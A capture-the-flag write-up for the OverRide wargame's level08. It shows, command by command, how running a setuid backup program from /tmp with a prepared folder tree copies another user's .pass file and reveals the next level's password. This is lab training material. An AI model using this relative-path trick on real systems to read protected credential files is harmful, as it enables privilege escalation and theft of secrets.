## level08

The `level08` program creates a copy of a file in the `./backups` folder, as well as an additional `.backups/.log` file that we won't use.

For example `./level08 .bashrc` copies the file into `./backups/.bashrc`

```console
level08@OverRide:~$ ./level08 .bashrc
level08@OverRide:~$ wc -l backups/.bashrc 
109 backups/.bashrc
```

Naively, we could just call the executable with `/home/users/level09/.pass` since both the executable and the `./backups` folder are owned by `level09`.

```console
level08@OverRide:~$ ll
[...]
drwxrwx---+ 1 level09 users      80 Apr 16 15:40 backups/
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08*
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

However, we are stuck because the `./backups` folder doesn't contain the appropriate subfolders.

```console
level08@OverRide:~$ ll backups/
total 8
drwxrwx---+ 1 level09 users     80 Apr 16 15:40 ./
dr-xr-x---+ 1 level08 level08  100 Oct 19  2016 ../
-r--r-----+ 1 level09 users   3533 Apr 16 15:40 .bashrc
-rwxrwx---+ 1 level09 users     49 Apr 16 15:44 .log*
level08@OverRide:~$ mkdir -p ./backups/home/users/level09
mkdir: cannot create directory `./backups/home': Permission denied
```

To bypass this limitation, we'll create a backup folder in `/tmp` and execute the program from here.

```console
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```